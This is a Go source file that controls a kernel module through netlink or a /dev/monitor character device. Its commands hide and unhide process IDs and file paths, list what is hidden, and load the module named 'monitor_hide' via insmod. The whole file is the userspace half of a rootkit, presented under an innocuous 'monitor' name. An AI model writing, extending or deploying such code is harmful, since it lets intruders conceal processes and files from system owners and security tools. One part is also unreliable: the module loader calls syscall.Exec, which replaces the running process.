package kernel

import (
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	ErrNetlinkFailed    = errors.New("netlink communication failed")
	ErrDeviceFailed     = errors.New("device communication failed")
	ErrModuleNotLoaded  = errors.New("kernel module not loaded")
	ErrInvalidResponse  = errors.New("invalid response from kernel")
	ErrAlreadyHidden    = errors.New("process/file already hidden")
	ErrNotHidden        = errors.New("process/file not hidden")
)

const (
	NetlinkProtocol    = 31
	MaxPayloadSize     = 4096
	NetlinkTimeout     = 5 * time.Second
	DevicePath         = "/dev/monitor"
	MaxHiddenItems     = 256
)

// Command codes
const (
	CmdHidePid    = 1
	CmdUnhidePid  = 2
	CmdHideFile   = 3
	CmdUnhideFile = 4
	CmdListHidden = 5
	CmdPing       = 6
)

// NetlinkMessage represents a netlink message
type NetlinkMessage struct {
	Header syscall.NlMsghdr
	Data   []byte
}

// NetlinkCommunicator handles communication with kernel module via netlink
type NetlinkCommunicator struct {
	mu        sync.Mutex
	fd        int
	pid       uint32
	connected bool
	seq       uint32
}

// DeviceCommunicator handles communication with kernel module via character device
type DeviceCommunicator struct {
	mu   sync.Mutex
	file *os.File
	path string
}

// KernelCommunicator interface for kernel communication
type KernelCommunicator interface {
	HidePid(pid int, comm string) error
	UnhidePid(pid int) error
	HideFile(path string) error
	UnhideFile(path string) error
	ListHidden() ([]int, []string, error)
	Ping() bool
	Close() error
}

// NewNetlinkCommunicator creates a new netlink communicator
func NewNetlinkCommunicator() (*NetlinkCommunicator, error) {
	fd, err := syscall.Socket(syscall.AF_NETLINK, syscall.SOCK_RAW, NetlinkProtocol)
	if err != nil {
		return nil, fmt.Errorf("failed to create netlink socket: %w", err)
	}

	// Bind to netlink socket
	addr := &syscall.SockaddrNetlink{
		Family: syscall.AF_NETLINK,
	}

	if err := syscall.Bind(fd, addr); err != nil {
		syscall.Close(fd)
		return nil, fmt.Errorf("failed to bind netlink socket: %w", err)
	}

	nlc := &NetlinkCommunicator{
		fd:        fd,
		pid:       uint32(os.Getpid()),
		connected: true,
		seq:       uint32(time.Now().Unix()),
	}

	return nlc, nil
}

// NewDeviceCommunicator creates a new device communicator
func NewDeviceCommunicator(path string) (*DeviceCommunicator, error) {
	file, err := os.OpenFile(path, syscall.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("failed to open device: %w", err)
	}

	return &DeviceCommunicator{
		file: file,
		path: path,
	}, nil
}

// HidePid hides a process with the given PID
func (n *NetlinkCommunicator) HidePid(pid int, comm string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return ErrModuleNotLoaded
	}

	// Build command data
	data := make([]byte, 4+4+256) // cmd + pid + comm
	binary.LittleEndian.PutUint32(data[0:4], CmdHidePid)
	binary.LittleEndian.PutUint32(data[4:8], uint32(pid))
	copy(data[8:], comm)

	// Send command
	if err := n.sendMessage(data); err != nil {
		return fmt.Errorf("%w: %v", ErrNetlinkFailed, err)
	}

	return nil
}

// UnhidePid unhides a process with the given PID
func (n *NetlinkCommunicator) UnhidePid(pid int) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return ErrModuleNotLoaded
	}

	data := make([]byte, 4+4) // cmd + pid
	binary.LittleEndian.PutUint32(data[0:4], CmdUnhidePid)
	binary.LittleEndian.PutUint32(data[4:8], uint32(pid))

	if err := n.sendMessage(data); err != nil {
		return fmt.Errorf("%w: %v", ErrNetlinkFailed, err)
	}

	return nil
}

// HideFile hides a file with the given path
func (n *NetlinkCommunicator) HideFile(path string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return ErrModuleNotLoaded
	}

	data := make([]byte, 4+512) // cmd + path
	binary.LittleEndian.PutUint32(data[0:4], CmdHideFile)
	copy(data[4:], path)

	if err := n.sendMessage(data); err != nil {
		return fmt.Errorf("%w: %v", ErrNetlinkFailed, err)
	}

	return nil
}

// UnhideFile unhides a file with the given path
func (n *NetlinkCommunicator) UnhideFile(path string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return ErrModuleNotLoaded
	}

	data := make([]byte, 4+512) // cmd + path
	binary.LittleEndian.PutUint32(data[0:4], CmdUnhideFile)
	copy(data[4:], path)

	if err := n.sendMessage(data); err != nil {
		return fmt.Errorf("%w: %v", ErrNetlinkFailed, err)
	}

	return nil
}

// ListHidden lists all hidden PIDs and files
func (n *NetlinkCommunicator) ListHidden() ([]int, []string, error) {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return nil, nil, ErrModuleNotLoaded
	}

	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data[0:4], CmdListHidden)

	if err := n.sendMessage(data); err != nil {
		return nil, nil, fmt.Errorf("%w: %v", ErrNetlinkFailed, err)
	}

	// Receive response
	resp, err := n.receiveMessage()
	if err != nil {
		return nil, nil, err
	}

	// Parse response (format: count_pid, pid1, pid2, ..., count_file, file1, file2, ...)
	return parseListResponse(resp)
}

// Ping sends a ping to the kernel module
func (n *NetlinkCommunicator) Ping() bool {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return false
	}

	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data[0:4], CmdPing)

	if err := n.sendMessage(data); err != nil {
		return false
	}

	_, err := n.receiveMessage()
	return err == nil
}

// Close closes the netlink socket
func (n *NetlinkCommunicator) Close() error {
	n.mu.Lock()
	defer n.mu.Unlock()

	if !n.connected {
		return nil
	}

	n.connected = false
	return syscall.Close(n.fd)
}

// sendMessage sends a message to the kernel module
func (n *NetlinkCommunicator) sendMessage(data []byte) error {
	n.seq++

	// Create netlink message
	nlMsg := NetlinkMessage{
		Header: syscall.NlMsghdr{
			Len:   uint32(syscall.NLMSG_HDRLEN + len(data)),
			Type:  0,
			Flags: syscall.NLM_F_REQUEST | syscall.NLM_F_ACK,
			Seq:   n.seq,
			Pid:   n.pid,
		},
		Data: data,
	}

	// Serialize message
	buf := make([]byte, nlMsg.Header.Len)
	headerBytes := (*(*[syscall.NLMSG_HDRLEN]byte)(unsafe.Pointer(&nlMsg.Header)))[:]
	copy(buf[0:], headerBytes)
	copy(buf[syscall.NLMSG_HDRLEN:], nlMsg.Data)

	// Send message
	destAddr := &syscall.SockaddrNetlink{
		Family: syscall.AF_NETLINK,
	}

	err := syscall.Sendto(n.fd, buf, 0, destAddr)
	if err != nil {
		return fmt.Errorf("sendto failed: %w", err)
	}

	return nil
}

// receiveMessage receives a message from the kernel module
func (n *NetlinkCommunicator) receiveMessage() ([]byte, error) {
	// Set receive timeout
	tv := syscall.Timeval{
		Sec:  int64(NetlinkTimeout.Seconds()),
		Usec: int64(NetlinkTimeout.Microseconds()) % 1000000,
	}
	syscall.SetsockoptTimeval(n.fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &tv)

	// Receive message
	buf := make([]byte, os.Getpagesize())
	nr, _, err := syscall.Recvfrom(n.fd, buf, 0)
	if err != nil {
		return nil, fmt.Errorf("recvfrom failed: %w", err)
	}

	if nr < syscall.NLMSG_HDRLEN {
		return nil, ErrInvalidResponse
	}

	// Parse netlink header
	msg := (*syscall.NlMsghdr)(unsafe.Pointer(&buf[0]))
	if msg.Len <= uint32(syscall.NLMSG_HDRLEN) {
		return nil, ErrInvalidResponse
	}

	// Extract payload
	payload := buf[syscall.NLMSG_HDRLEN:int(msg.Len)]
	return payload, nil
}

// parseListResponse parses the list command response
func parseListResponse(data []byte) ([]int, []string, error) {
	if len(data) < 8 {
		return nil, nil, ErrInvalidResponse
	}

	pidCount := int(binary.LittleEndian.Uint32(data[0:4]))
	fileCount := int(binary.LittleEndian.Uint32(data[4:8]))

	offset := 8
	pids := make([]int, 0, pidCount)
	files := make([]string, 0, fileCount)

	// Read PIDs
	for i := 0; i < pidCount && offset+4 <= len(data); i++ {
		pid := int(binary.LittleEndian.Uint32(data[offset : offset+4]))
		pids = append(pids, pid)
		offset += 4
	}

	// Read files
	for i := 0; i < fileCount && offset+4 <= len(data); i++ {
		strLen := int(binary.LittleEndian.Uint32(data[offset : offset+4]))
		offset += 4
		if offset+strLen > len(data) {
			break
		}
		file := string(data[offset : offset+strLen])
		files = append(files, file)
		offset += strLen
	}

	return pids, files, nil
}

// Device communicator methods

// HidePid hides a process via character device
func (d *DeviceCommunicator) HidePid(pid int, comm string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return ErrModuleNotLoaded
	}

	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		d.file.Fd(),
		uintptr(CmdHidePid),
		uintptr(pid),
	)

	if errno != 0 {
		return fmt.Errorf("%w: %v", ErrDeviceFailed, errno)
	}

	return nil
}

// UnhidePid unhides a process via character device
func (d *DeviceCommunicator) UnhidePid(pid int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return ErrModuleNotLoaded
	}

	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		d.file.Fd(),
		uintptr(CmdUnhidePid),
		uintptr(pid),
	)

	if errno != 0 {
		return fmt.Errorf("%w: %v", ErrDeviceFailed, errno)
	}

	return nil
}

// HideFile hides a file via character device
func (d *DeviceCommunicator) HideFile(path string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return ErrModuleNotLoaded
	}

	// For file operations, we need to use write
	data := make([]byte, 4+len(path))
	binary.LittleEndian.PutUint32(data[0:4], CmdHideFile)
	copy(data[4:], path)

	_, err := d.file.Write(data)
	if err != nil {
		return fmt.Errorf("%w: %v", ErrDeviceFailed, err)
	}

	return nil
}

// UnhideFile unhides a file via character device
func (d *DeviceCommunicator) UnhideFile(path string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return ErrModuleNotLoaded
	}

	data := make([]byte, 4+len(path))
	binary.LittleEndian.PutUint32(data[0:4], CmdUnhideFile)
	copy(data[4:], path)

	_, err := d.file.Write(data)
	if err != nil {
		return fmt.Errorf("%w: %v", ErrDeviceFailed, err)
	}

	return nil
}

// ListHidden lists hidden items via character device
func (d *DeviceCommunicator) ListHidden() ([]int, []string, error) {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return nil, nil, ErrModuleNotLoaded
	}

	// Device doesn't support listing, return empty
	return []int{}, []string{}, nil
}

// Ping checks if kernel module is available via character device
func (d *DeviceCommunicator) Ping() bool {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return false
	}

	// Try to stat the device file
	info, err := d.file.Stat()
	return err == nil && info.Mode()&os.ModeDevice != 0
}

// Close closes the character device
func (d *DeviceCommunicator) Close() error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.file == nil {
		return nil
	}

	err := d.file.Close()
	d.file = nil
	return err
}

// AutoCommunicator automatically selects the best communication method
type AutoCommunicator struct {
	communicator KernelCommunicator
	method        string
}

// NewAutoCommunicator creates a communicator that tries multiple methods
func NewAutoCommunicator() (*AutoCommunicator, error) {
	// Try device first (more reliable)
	deviceComm, err := NewDeviceCommunicator(DevicePath)
	if err == nil && deviceComm.Ping() {
		return &AutoCommunicator{
			communicator: deviceComm,
			method:        "device",
		}, nil
	}

	// Fall back to netlink
	netlinkComm, err := NewNetlinkCommunicator()
	if err == nil && netlinkComm.Ping() {
		return &AutoCommunicator{
			communicator: netlinkComm,
			method:        "netlink",
		}, nil
	}

	return nil, ErrModuleNotLoaded
}

// GetMethod returns the active communication method
func (a *AutoCommunicator) GetMethod() string {
	return a.method
}

// HidePid forwards to the active communicator
func (a *AutoCommunicator) HidePid(pid int, comm string) error {
	return a.communicator.HidePid(pid, comm)
}

// UnhidePid forwards to the active communicator
func (a *AutoCommunicator) UnhidePid(pid int) error {
	return a.communicator.UnhidePid(pid)
}

// HideFile forwards to the active communicator
func (a *AutoCommunicator) HideFile(path string) error {
	return a.communicator.HideFile(path)
}

// UnhideFile forwards to the active communicator
func (a *AutoCommunicator) UnhideFile(path string) error {
	return a.communicator.UnhideFile(path)
}

// ListHidden forwards to the active communicator
func (a *AutoCommunicator) ListHidden() ([]int, []string, error) {
	return a.communicator.ListHidden()
}

// Ping forwards to the active communicator
func (a *AutoCommunicator) Ping() bool {
	return a.communicator.Ping()
}

// Close forwards to the active communicator
func (a *AutoCommunicator) Close() error {
	return a.communicator.Close()
}

// CheckKernelModule checks if the kernel module is loaded
func CheckKernelModule() bool {
	// Check for character device
	if _, err := os.Stat(DevicePath); err == nil {
		return true
	}

	// Check for module in /proc/modules
	data, err := os.ReadFile("/proc/modules")
	if err != nil {
		return false
	}

	// Search for monitor_hide module
	target := []byte("monitor_hide")
	for _, line := range bytesSplit(data, '\n') {
		if bytesContains(line, target) {
			return true
		}
	}

	return false
}

// LoadKernelModule loads the kernel module
func LoadKernelModule(modulePath string) error {
	if CheckKernelModule() {
		return nil // Already loaded
	}

	// Use insmod to load the module
	if err := syscall.Exec("/sbin/insmod", []string{"insmod", modulePath}, nil); err != nil {
		return fmt.Errorf("failed to load kernel module: %w", err)
	}

	return nil
}

// Helper functions for byte operations
func bytesSplit(data []byte, sep byte) [][]byte {
	var parts [][]byte
	start := 0
	for i, b := range data {
		if b == sep {
			parts = append(parts, data[start:i])
			start = i + 1
		}
	}
	if start < len(data) {
		parts = append(parts, data[start:])
	}
	return parts
}

func bytesContains(data, target []byte) bool {
	for i := 0; i <= len(data)-len(target); i++ {
		match := true
		for j := range target {
			if data[i+j] != target[j] {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}
